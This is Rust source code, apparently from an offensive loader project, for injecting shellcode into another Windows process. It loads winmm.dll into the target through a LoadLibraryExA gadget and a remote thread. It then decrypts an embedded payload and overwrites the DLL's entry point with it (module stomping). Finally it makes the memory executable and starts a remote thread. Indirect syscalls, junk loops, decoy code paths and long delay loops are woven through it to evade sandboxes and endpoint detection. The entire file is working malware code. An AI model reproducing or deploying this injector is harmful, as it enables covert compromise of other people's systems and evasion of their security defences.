use std::ffi::{c_void, CString};
use std::{thread, time};
use std::hint::black_box;

use windows::Win32::Foundation::HANDLE;

use crate::common::utils::align_page;
use crate::crypto::extract::extract_and_decrypt_payload;
use crate::injection::trampoline::loadlibrary_gadged;
use crate::injection::module_stomping::run_module_stomp;
use crate::evasion::junk::{generate_user_context_hash, process_system_logs};
use crate::process::memory::{searcher_address_dll, getremotedllentrypoint};
use crate::process::thread::create_remote_thread;
use crate::pe::exports::searcher_loadlibrary;
use crate::{debug, tartarusgate};

pub fn inject(process_handle: HANDLE) -> Result<(), Box<dyn std::error::Error>> {
    let dll = CString::new("C:\\windows\\system32\\winmm.dll").unwrap();
    let mut size_dll = dll.as_bytes_with_nul().len() as usize;

    unsafe {
        let mut addr: usize = 0;
        let mut val = std::process::id();
        let ptr = &mut val as *mut u32 as *mut i32;

        if ptr.read_volatile() > 0 {
            let status = tartarusgate!("NtAllocateVirtualMemory", process_handle.0 as usize, &mut addr as *mut _ as usize, 0, &mut size_dll as *mut _ as usize, 0x00003000, 0x04);
            debug!("Status NtAllocateVirtualMemory: {status:X}");
            if status == 0 {
                debug!("No se pudo alojar memoria virtual");
            }
            debug!("Direccion de memoria alojada: {:?}", addr);

            (0..1000).for_each(|i| std::ptr::write_volatile(&mut i.clone(), i * 2));

            let mut written_bytes: usize = 0;
            let status = tartarusgate!("NtWriteVirtualMemory", process_handle.0 as usize, addr, dll.as_ptr() as usize, size_dll, &mut written_bytes as *mut _ as usize);
            debug!("Estatus NtWriteVirtualMemory {status:X}");
            debug!("Bytes copiados: {:?} - {:?}", written_bytes, size_dll);
            debug!("Se ha escrito la direccion de la DLL en el proceso");
        } else {
            let number = generate_user_context_hash("admin");
            println!("{number:? }");
        }

        let address_loadlibrary = searcher_loadlibrary("kernel32.dll", "LoadLibraryExA")?;
        debug!("La direccion de LoadLibraryExA: {:?}", address_loadlibrary);

        let gadged_addr = loadlibrary_gadged(address_loadlibrary, process_handle)?;
        debug!("Direccion del gadged alojado: {:?}", gadged_addr);

        let _t_handle = create_remote_thread(process_handle, gadged_addr, addr)?;

        debug!("DLL \"winmm.dll\" cargada en proceso remoto");
        thread::sleep(time::Duration::from_secs(3));

        let name_dll = "winmm.dll";
        let addr_dll = searcher_address_dll(process_handle, name_dll)?;
        debug!("La direccion de la DLL en el proceso: {:?}", addr_dll);

        let entrypoint = getremotedllentrypoint(process_handle, addr_dll)?;
        debug!("EntryPoint de la DLL: {:?}", entrypoint);

        match extract_and_decrypt_payload() {
            Ok(shellcode) => {
                let sh_size: usize = shellcode.len();
                let mut region_size = align_page(shellcode.len());
                let mut addr: usize = 0;

                debug!("Shellcode len: {:?}", sh_size);

                let now = std::time::SystemTime::now();
                if now.elapsed().is_ok() {
                    let mut x = 0;
                    for i in 0..1000 {
                        x += i;
                    }
                    std::hint::black_box(x);
                }

                let status = tartarusgate!("NtAllocateVirtualMemory", process_handle.0 as usize, &mut addr as *mut _ as usize, 0, &mut region_size as *mut _ as usize, 0x00003000, 0x04);
                debug!("Estado de funcion NtAllocateVirtualMemory: {:?}", status);
                debug!("Cantidad de memoria alojada: {:?}", sh_size);
                debug!("Direccion de memoria alojada: 0x{:X}", addr);

                let mut written_bytes: usize = 0;
                let status = tartarusgate!("NtWriteVirtualMemory", process_handle.0 as usize, addr, shellcode.as_ptr() as usize, shellcode.len() as usize, &mut written_bytes as *mut _ as usize);
                debug!("Estado de funcion NtWriteVirtualMemory: {:X}", status);
                debug!("Bytes escritos: {:?}", written_bytes);

                (0..1000).for_each(|i| std::ptr::write_volatile(&mut i.clone(), i * 2));
                debug!("Se ha reservado y escrito la shellcode en la memoria del proceso");

                let x = std::time::Instant::now().elapsed().as_nanos();
                if (x * (x + 1)) % 2 == 0 {
                    run_module_stomp(process_handle, entrypoint, addr)?;
                } else {
                    std::ptr::read_volatile(0 as *const u64);
                    process_system_logs();
                }

                let mut old_protect = 0;
                let mut base = addr as *mut c_void;
                let mut size = shellcode.len();

                let status = tartarusgate!("NtProtectVirtualMemory", process_handle.0 as usize, &mut base as *mut _ as usize, &mut size as *mut _ as usize, 0x20, &mut old_protect as *mut _ as usize);
                debug!("Estado de NtProtectVirtualMemory: {:X}", status);
                if status != 0 {
                    return Err("No se pudo cambiar los permisos a ejecucion de la shellcode".into());
                }
                debug!("Permisos de la shellcode se han cambiado a memoria ejecutable");

                let mut v = 0u64;
                for i in 0..2_000_000_000 {
                    v = v.wrapping_add(i * 12345);
                }
                black_box(v);

                let t_handle = create_remote_thread(process_handle, entrypoint as usize, entrypoint as usize)?;

                thread::sleep(time::Duration::from_secs(10));

                let status = tartarusgate!("NtClose", t_handle.0 as usize);
                debug!("Status de NtClose: {status:X}");

                let status = tartarusgate!("NtClose", process_handle.0 as usize);
                debug!("Status de NtClose: {status:X}");

                let _ = tartarusgate!("NtTerminateProcess", 0usize, 0usize);
            },
            Err(_e) => {
                debug!("Dio error el extractor de shellcode");
            }
        }
    }
    Ok(())
}
